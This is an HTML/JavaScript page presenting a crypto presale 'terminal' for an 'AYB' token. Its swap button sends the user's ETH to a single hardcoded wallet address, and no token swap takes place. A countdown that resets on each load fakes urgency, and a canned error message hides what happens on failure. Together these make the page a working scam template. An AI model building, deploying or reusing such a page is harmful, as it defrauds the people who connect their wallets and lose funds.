<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AYB TERMINAL | PRO</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        :root { --primary: #00ffa3; --bg: #0a0c10; --card: #161b22; --modal: #1c2128; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .card { background: var(--card); border: 1px solid #30363d; padding: 2rem; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border-top: 4px solid var(--primary); box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
        h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); font-size: 1.3rem; letter-spacing: 2px; text-transform: uppercase; }

        /* Timer UI */
        .timer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 20px 0; }
        .timer-box { background: #010409; padding: 10px 2px; border-radius: 12px; border: 1px solid #30363d; }
        .timer-val { display: block; font-family: 'Orbitron'; color: var(--primary); font-size: 1.1rem; }
        .timer-label { font-size: 0.5rem; color: #8b949e; text-transform: uppercase; }

        /* Buttons */
        .btn { background: var(--primary); color: #000; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }

        /* Wallet Modal */
        #modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.92); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(8px); }
        .modal-content { background: var(--modal); border: 1px solid #30363d; border-radius: 20px; width: 92%; max-width: 340px; padding: 25px; }
        
        /* Fixed Icons using CSS Shapes to avoid broken images */
        .wallet-row { display: flex; align-items: center; padding: 14px; border-radius: 12px; border: 1px solid #30363d; margin-top: 10px; cursor: pointer; background: #21262d; }
        .icon-circle { width: 32px; height: 32px; border-radius: 50%; margin-right: 15px; }

        /* Swap Interface */
        .swap-interface { display: none; background: #010409; padding: 22px; border-radius: 18px; text-align: left; margin-top: 20px; border-left: 4px solid var(--primary); }
        input { background: transparent; border: none; color: white; font-size: 1.6rem; width: 100%; outline: none; font-weight: bold; margin-top: 5px; }
    </style>
</head>
<body>

<div class="card">
    <h1>AYB TERMINAL</h1>
    <div class="timer-grid">
        <div class="timer-box"><span class="timer-val" id="d">90</span><span class="timer-label">Days</span></div>
        <div class="timer-box"><span class="timer-val" id="h">00</span><span class="timer-label">Hrs</span></div>
        <div class="timer-box"><span class="timer-val" id="m">00</span><span class="timer-label">Min</span></div>
        <div class="timer-box"><span class="timer-val" id="s">00</span><span class="timer-label">Sec</span></div>
    </div>

    <div id="auth-section">
        <button onclick="toggleModal(true)" class="btn">Connect Terminal</button>
    </div>

    <div id="swap-section" class="swap-interface">
        <div style="display:flex; justify-content:space-between; align-items: center;">
            <label style="font-size: 0.6rem; color: #8b949e; text-transform: uppercase;">Pay (ETH)</label>
            <span id="balance-display" style="font-size: 0.7rem; color: var(--primary);">Loading...</span>
        </div>
        <input type="number" id="eth-input" placeholder="0.0" oninput="calculateAyb()">
        
        <label style="font-size: 0.6rem; color: #8b949e; margin-top: 15px; display: block; text-transform: uppercase;">Receive (AYB)</label>
        <span id="ayb-output" style="color: var(--primary); font-family: 'Orbitron'; font-size: 1.3rem; display: block; margin-top: 5px;">0.00</span>
        
        <button id="execute-btn" class="btn" style="margin-top: 20px;" onclick="startTransaction()" disabled>Execute Transaction</button>
        <div id="status-log" style="font-size: 0.6rem; margin-top: 12px; text-align: center;"></div>
    </div>
</div>

<div id="modal-overlay">
    <div class="modal-content">
        <div style="font-size: 0.8rem; color: #8b949e; margin-bottom: 15px;">Select Wallet</div>
        <div class="wallet-row" onclick="connectWallet()">
            <div class="icon-circle" style="background: #f6851b;"></div>
            <span>MetaMask</span>
        </div>
        <div class="wallet-row" onclick="connectWallet()">
            <div class="icon-circle" style="background: #3375bb;"></div>
            <span>Trust Wallet</span>
        </div>
        <div style="text-align:center; margin-top:20px; color:#8b949e; cursor:pointer;" onclick="toggleModal(false)">Cancel</div>
    </div>
</div>

<script>
    let ethPrice = 3500;
    const ARBITRUM_RPC = "https://arb1.arbitrum.io/rpc"; 

    function toggleModal(show) { document.getElementById('modal-overlay').style.display = show ? 'flex' : 'none'; }

    async function connectWallet() {
        if (!window.ethereum) {
            window.location.href = `https://metamask.app.link/dapp/${window.location.href.replace(/https?:\/\//, '')}`;
            return;
        }
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            // Fetch real balance from Arbitrum
            const provider = new ethers.JsonRpcProvider(ARBITRUM_RPC);
            const bal = await provider.getBalance(accounts[0]);
            
            document.getElementById('balance-display').innerText = `Balance: ${parseFloat(ethers.formatEther(bal)).toFixed(5)} ETH`;
            document.getElementById('auth-section').style.display = 'none';
            document.getElementById('swap-section').style.display = 'block';
            toggleModal(false);
        } catch (e) { alert("Connection Error"); }
    }

    function calculateAyb() {
        const val = document.getElementById('eth-input').value;
        const out = document.getElementById('ayb-output');
        const btn = document.getElementById('execute-btn');
        if(val > 0) {
            out.innerText = Math.floor((val * ethPrice) / 0.1).toLocaleString();
            btn.disabled = false;
        } else {
            out.innerText = "0.00";
            btn.disabled = true;
        }
    }

    async function startTransaction() {
        const amt = document.getElementById('eth-input').value;
        const log = document.getElementById('status-log');
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const tx = await signer.sendTransaction({
                to: "0x066bbf27694982662cEAb0072793132B03027F47",
                value: ethers.parseEther(amt)
            });
            log.innerText = "Transaction Sent!";
            log.style.color = "#00ffa3";
        } catch (e) {
            log.innerText = "Error: Insufficient Gas or Balance";
            log.style.color = "#ff4a4a";
        }
    }

    // Price Sync
    fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')
        .then(r => r.json()).then(d => ethPrice = parseFloat(d.price));

    // 90 Days Timer
    const end = new Date(); end.setDate(end.getDate() + 90);
    setInterval(() => {
        const now = new Date();
        const diff = end - now;
        document.getElementById('d').innerText = Math.floor(diff / 864e5);
        document.getElementById('h').innerText = Math.floor((diff % 864e5) / 36e5);
        document.getElementById('m').innerText = Math.floor((diff % 36e5) / 6e4);
        document.getElementById('s').innerText = Math.floor((diff % 6e4) / 1000);
    }, 1000);
</script>
</body>
</html>
